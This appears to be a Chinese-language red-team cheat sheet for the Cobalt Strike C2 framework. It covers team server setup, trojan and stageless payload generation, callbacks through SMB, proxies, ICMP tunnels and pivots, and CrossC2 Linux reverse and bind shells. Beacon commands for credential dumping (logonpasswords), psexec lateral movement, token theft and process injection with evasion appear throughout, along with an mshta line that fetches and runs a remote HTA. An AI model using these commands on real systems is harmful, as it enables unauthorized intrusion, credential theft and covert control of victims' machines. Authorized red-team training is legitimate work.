https://mp.weixin.qq.com/s/F1H4ReV71gK7JeoYxV3n5g
https://github.com/k8gege/Aggressor/releases/tag/cs
## 环境介绍
### 启动

```shell
# windows
teamserver.bat 192.168.50.161 123456

# Linux
chomd 777 teamserver
./teamserver 192.168.159.130 pass

-xms 要 <= xmx
# 中文乱码 client
java -Dfile.encoding=utf-8 ...
```

如果报错,设置内存
```bash
java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar
# jdk11 启动
```

### 工具栏

![](https://s2.loli.net/2022/05/18/ot2CiV7mMeKuLq5.jpg)

[hosts / hosts (stager)](https://blog.csdn.net/qq_41874930/article/details/115545366)
可以上线到多个cs 服务器

### 插件安装 

Cobalt strike - 左上角菜单: 脚本管理器 - 选中cna - Load
安装 梼机/OLa

攻击
- Office木马, 生成后监制到docm
- 分阶段木马 - 无法选择中转监听器
- 无阶段木马

Web Drive-by:
- Manage 管理当前Team Server开启的所有web服务
- Clone Site 克隆某网站
- Host File 在Team Server的某端口提供Web以供下载某文件
- Scripted Web Delivery 为payload提供web服务以便于下载和执行
- System Profiler 用来获取系统信息:系统版本, Flash版本,浏览器 版本等

#### Ladon
http://k8gege.org/p/Ladon.html

### Other
meterpreter_reverse_tcp 是不分阶段的payload，要生成 stageless exe.
[stager和stageless区别](https://www.freebuf.com/articles/system/187312.html)

## Attack使用
```shell
sleep 0
shell ipconfig
logonpasswords # 抓取密码 https://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484470&idx=1&sn=b2f7b56028ddf701a903d981e58e324e
psexec # 链接同上
开启中转代理 # 右击主机 - Pivot - socks server(监听在cs server), 速度比较慢但省事, 可用 gost 转成socks 配合 fscan(建议用其他代理出来, 不然太慢)

# 1.exe # 2.hta
mshta http://xx/file.hta
```
### 多种上线方式/内网/代理

0. bind方式上线
1. [SMB bacon](https://cloud.tencent.com/developer/article/2036092) [2](https://forum.butian.net/share/1644) 
2. 中转listenr, 用 tcp Listener, 步骤同1
3. 代理上线 goproxy
4. 正向tcp
5. 中转上线
6. [仅ICMP出网pingtunnel上线msf&cs](https://xz.aliyun.com/t/10626#toc-9)
6. [仅ICMP出网SPP上线Cobalt Strike](https://xz.aliyun.com/t/10626#toc-16)

5. pystinger

0.bind方式上线
```
1) 生成 Stageless payload, 在目标机运行
2) 右击跳板机Session - Interactive
3) bind 目标ip
```
1.SMB bacon
```shell
1.新建 smb listener
2.上线主机右击: portscan,
3.扫出来的主机 右击 - Jump - psexec64 -选一个账号, - listener:smb
```

3.代理上线
```shell
#1.边缘主机131上代理服务 goproxy 
proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
#2.然后端口转发到外网ip88上, netsh 总出问题，建议用别的。或者每次删除掉再add
netsh interface portproxy add v4tov4 listenaddress=192.168.111.131 listenport=822 connectaddress=192.168.1.88 connectport=8080
#3.cs端 创建 Listener，配置如下
HTTP HOSTS: 192.168.1.89
HTTP Port: 随便填
HTTP Proxy: http://192.168.111.131:822
# 连接过程  192.168.111.236  → 192.168.111.131:822→ 192.168.1.88:8080→ C2(192.168.1.89)
# 攻击机89, 边缘机双ip:1.88/111.131, 内网111.236
#4.生成stageless payload
```
重要: __生成stageless payload__


4.正向tcp
```
1.beacon生成一个stageless形式的木马：上传到目标机器运行：
2.在中转机器的Beacon里使用 connect [ip address] [port]

99.销毁Beacon 链接, 在父会话或子会话的控制台中使用 unlink [ip address] [session PID] 。以后，你可以从同一主机（或其他主机）重新连接到 TCP Beacon。
```

5.中转上线

```
右击某 session - Pivoting - Listener 填好内网地址等信息, name:pivot
菜单Attack - Executable(S), 生成stateless 的 exe, listener: pivot
```
#### 上线Linux
CrossC2 - 上线linux插件

```shell
# reverse shell
## 有 profile
gcc test.c -fPIC -shared -o lib_rebind_test.so # test2.c中替换了memcpy防止低系统无法运行
./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
## 无 profile
./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null Linux x64 ./test
./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null:config.ini Linux x64 t_cc2.out
# bind shell
./genCrossC2.Linux 192.168.50.161 4431 ./.cobaltstrike.beacon_keys null Linux-bind x64 t3.out
```

### 代理服务器

Pivoting->SOCKS Server  # 这时监听的ip是cs服务器ip
### 与MSF联动 

[Interoperability with the Metasploit Framework](https://www.cobaltstrike.com/blog/interoperability-with-the-metasploit-framework/)
### 钓鱼攻击/Clone Site

https://blog.csdn.net/B_2013617/article/details/117079467
https://www.youtube.com/watch?time_continue=2&v=fnCLdPOmZOk&feature=emb_logo
[MSF上线CS_adobe flash](https://www.youtube.com/watch?v=fnCLdPOmZOk&t=2s)
erwerwer
## Beacon/Cmd
```shell
# ec2 - smb 是一个Listener
beacon > jump psexec64 FILESERVER ec2 - smb

beacon > connect [host] [port] # Link to a Beacon peer
beacon > unlink 10.10.10.191 1052 # De-link to a Beacon peer
beacon > rev2self # 恢复原始令牌

beacon > make_token teamssix\administrator Test123!
beacon > jump psexec_psh 192.168.175.200 smb
```

* Agent Context
  - cd, pwd, setenv
- File System
  - cp,drives,is,mkdir,mv,rm
  - download,upload
* Process Management
  - kill,ps
* Query the Registry
  - reg query,reg queryv
<br><br>

* Console Tips
  - `Ctrl+D` closes the console (or other active tab)
  - `Ctrl+K` clears the console screen
  - `Ctrl+F` opens a find tool to search the console (works in most other tabs too)
* Beacon Management
  - Use the `clear` command if you mess up

__Execute__
* Run a command,get output
  * `run command`
* Change to another folder
  * `cd c:\folder`
* Print the working directory
  * `pwd`
<br>

* __Use PowerShell through Beacon__
* Import a script:
  * `powershell-import /path/to/local.ps1`
* Use script:
  * `powershell cmdlet args`
* Get help for a script:
  * `powershell Get-Help cmdlet-Full`
<br><br>

* __Use a NET assembly through Beacon__
  * `execute-assembly [/local/file.exe][args]`
* Run a command via cmd.exe
  * `shell [command][args]`
* Use PowerShell without powershell.exe
  * `powerpick [cmdlet][args]`
* Run PowerShell within another process
  * `psinject [pid][arch][cmdlet][args]`


__Session__ 
右击 - Note , 加备注

__Session Passing__ 

* Spawn and Inject
  - `[beacon]` -> `Spawn` or `spawn [arch][listener]`
* Spawn with alternate parent and Inject
  - `spawnu [pid][listener]`
* Inject into specific process
  - `inject [pid][arch][listener]`


__Session Prepping__ 
* Configure "safe" temporary processes
  - Use `ps` to survey processes on target
  - Use `ppid` to anchor to a specific parent process， 
  - Use `spawnto [arch][path][args]` to change program Cobalt Strike launches for temporary processes
  - Use `blockdlls start` to enable DLL blocking (blinds userland hooks `[caveats apply]` on Windows 10)
<br>

1. 方式1. 右击 Session - Explore - Process List - 选一个进程 Inject
  - 右击某进程 - 设置为PPID, 使用spawn时, 会以新PPID生成
2. 方式2. `bacon > spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe`

## Plugins

### CrossC2/上线Linux

__使用profile__

protocol_demo有 `c2profile.c https.profile`

1. 使用 https.profile 启动 teamserver
1. 新建 `HTTPS` Listener, 只支持HTTPS
1. 编译 c2profile.c
1. 生成 bin 运行

```shell
teamserver.bat 192.168.50.161 xxxxxxx https.profile
gcc c2profile.c -fPIC -shared -o lib_rebind_test.so
./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
./test
```

修改心跳 CrossC2Kit_Loader.cna 末尾添加
```shell
# sleep 60
on ssh_initial {
    # show_message("1有新的LIUNX主机上线\nIP为".beacon_info($1,"internal")."\n主机名字为：".beacon_info($1,"computer"));
    bsleep($1, 60);
}
```

# Learning

## Step1 

EventLog里可以聊天 交流。
/msg `butane text -- 私聊信息

Cobalt Strike Artifact Survey

| Artifact           | Migrates | RWX  | Module-less Thread |
| ------------------ | -------- | ---- | ------------------ |
| Executable         | no       | no   | no                 |
| DLL                | no       | no   | no                 |
| DLL(x64->x86)      | yes      | no   | yes                |
| Java Applet (x86)  | yes      | no   | no                 |
| Java Applet (x64)  | yes      | no   | yes                |
| PowerShell         | no       | yes  | no                 |
| Python             | no       | yes  | yes                |
| Service Executable | yes      | no   | no                 |
| VBA Macro          | yes      | yes  | yes                |

## plugin/CS插件
View - Script Console 

Aggressor Script: 是C2 3.0以上版本的一个内置的脚本语言,由Sleep脚本解析; 在CS 3.0以上的版本,菜单､选项､事件､都有默认的default.cna构建.
Sleep语言下载地址: http://sleep.dashnine.org/download/sleep.jar
- 快速使用: `java -jar sleep.jar` , 新建1.cna, 内容为 `println("hello, world")`, 进入后 `load 1.cna`
- 输出 hello word: Script Console 中 `e println("hello, world")`

help 查看一些帮助信息｡
- ? 进行一个简单的判断 ,返回值为True或者False,例如 `? int(1) == int(2)` 返回为False 
- e 执行我们写的代码,相当于交互模式,如果不加上 e 的话是无法执行的,例如 `e printn("Hello World")`
- 创建一个 command 名字为 w,当输入w的时候就打印hello word, 可以 `e command w{ println("hello, world"); }`

```
# 1.cna

command w{
    println("hello, world");
}
```

aggressor>w

彩色输出
```
println("\c0This is my color");
println("\c1This is my color"); # 这是黑色
println("\c2This is my color");
println("\c3This is my color");
println("\c4This is my color");
println("\c5This is my color");
println("\c6This is my color");
println("\c7This is my color");
println("\c8This is my color");
println("\c9This is my color");
println("\cAThis is my color");
println("\cBThis is my color");
println("\cCThis is my color");
println("\cDThis is my color");
println("\cEThis is my color");
println("\cFThis is my color");
```

键盘快捷键
```
bind Ctrl+H {
    show_message("Pressed Ctrl+H");  # 弹窗显示消息
    elog("使用了快捷键!");            # 在 Event Log位置显示信息
}
```

菜单编写
我们可以自己定义想要的菜单或者将我们的二级菜单添加到已经存在的主菜单下,创建自定义菜单语法如下:
```
popup <菜单函数名>{
    item(＂&<二级菜单显示>＂,{点击时执行的代码,或者函数}); #第一个子菜单
    separator();#分割线
    item(＂&<二级菜单名字>＂,(点击时执行的代码,或者函数}); #第二个子菜单
    separator(); #分割线
}
menubar("一级菜单显示名", "菜单函数名");
```

一个简单的菜单:
```
popup my_help{
    item("&这是百度",{url_open("http://www.baidu.com")});
    separator();
    item("&这是谷歌",{url_open("http://www.Google.com")}); # url_open()这个数是用来打开网站的
}
menubar ("帮助菜单", "my_help"); # 菜单函数,一定要加上
```
如果我们并不想创建新的菜单,而是想在默认的菜单上增加,我们可以这样做:

```
popup help { # 在help菜单中添加
    separator();
    item("&关于汉化",{show_message("4.1汉化 by XXX")});
}
```

__输入框的编写__

dialog 编写,接受三个参数

- `$1` 对话框的名称
- `$2` 对话框里面的内容,可以写多个
- `$3` 回调函数,当用户使用dbutton_action调用的函数
```
popup test{
    item("&收集信息",{dialog_test()}); # 建立一个菜单栏目,点击收集信息时就调用show函数
}
menubar("测试菜单","test"); # 注册菜单

sub show {
    println("hello, world");
    show_message("dialog的引用是:".$1."\n按钮名称是:".$2);
    println("用户名是:".$3["user"]."\n密码是:".$3["password"]); # 这里show函数接收到了dialog传递过来的参数
}

sub dialog_test {
    $info = dialog("这是对话框的标题",%(username => "root",password => ""),&show); # 第一个是菜单的名字,第二个是我们下面定义的菜单显示内容的默认值,第三个参数是我们回调函数,触发show函数的时候显示
    drow_text($info,"user","输入用户名:")
    drow_text($info,"password","输入密码");
    dbutton_action($info,"马上起飞!");
    dbutton_help($info,"http://www.baidu.com"); # 显示帮助信息
    dialog_show($info); # 显示文本输入框
}
```

# Article
[全网最全的Cobalt Strike使用教程系列-基础篇](https://mp.weixin.qq.com/s/4KvmV9cdyzPsYHtBlEKGFQ)
[干货|两个超实用的上线Cobaltstrike技巧！](https://mp.weixin.qq.com/s/jGwrVr0iotelS4KivC8pwA)
[全网最全的 Cobalt Strike 使用教程-内网渗透之域控攻击篇](https://mp.weixin.qq.com/s/Nfhwx0JRt5S5LbcsXNMeyg)
[Cobalt Strike Training Resources](https://www.cobaltstrike.com/training/)
[done 4/9 | Cobalt Strike Red Team Ops - Training Cours](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ)

## 使用帮助
[提取密码 | 对湾湾某网站的一次渗透测试](http://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484330&idx=1&sn=fa5f3c3de8737f3ddbc5622917b2c852)

## plugin
[分享个CobaltStrike插件 Bypass防护添加用户（附下载）](https://mp.weixin.qq.com/s/6nu1dwdvdtnP_6C-nIpMVg)
[Cobalt-Strike之CrossC2插件安装与linux上线](https://mp.weixin.qq.com/s/Fty2S9ettdtTFgJWVTvQNQ)
[CobaltStrike加载插件](https://mp.weixin.qq.com/s/NtxhTkuMGhhRyLUREnZQcA)

## Vocabulary

C2：Cobalt Strike
